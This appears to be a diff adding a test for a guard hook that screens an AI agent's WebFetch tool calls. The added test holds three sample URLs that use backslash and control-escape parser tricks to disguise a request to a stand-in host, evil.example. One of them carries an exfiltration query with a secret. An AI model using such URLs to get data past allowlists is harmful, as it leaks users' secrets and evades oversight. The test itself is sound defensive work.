@@ -142,3 +142,15 @@ def test_validator_green_with_guard_committed_and_unwired():
     )
     assert "report-only-guard" not in proc.stdout, (
         "validator flags the intentionally-unwired guard:\n" + proc.stdout)
+
+
+def test_json_control_escape_and_backslash_urls_denied():
+    """Raw backslash / JSON control-escapes in a fetch URL are a WHATWG vs
+    RFC-3986 parser-differential vector — fail closed (round-5 P1)."""
+    for raw in (r"https://github.com\t@evil.example/exfil?d=SECRET",
+                r"https://github.com\n@evil.example/x",
+                r"https://evil.example\@github.com/x"):
+        proc = run_guard({"tool_name": "WebFetch",
+                          "tool_input": {"url": raw},
+                          "hook_event_name": "PreToolUse"}, marked=True)
+        assert proc.returncode == 2, (raw, proc.returncode)
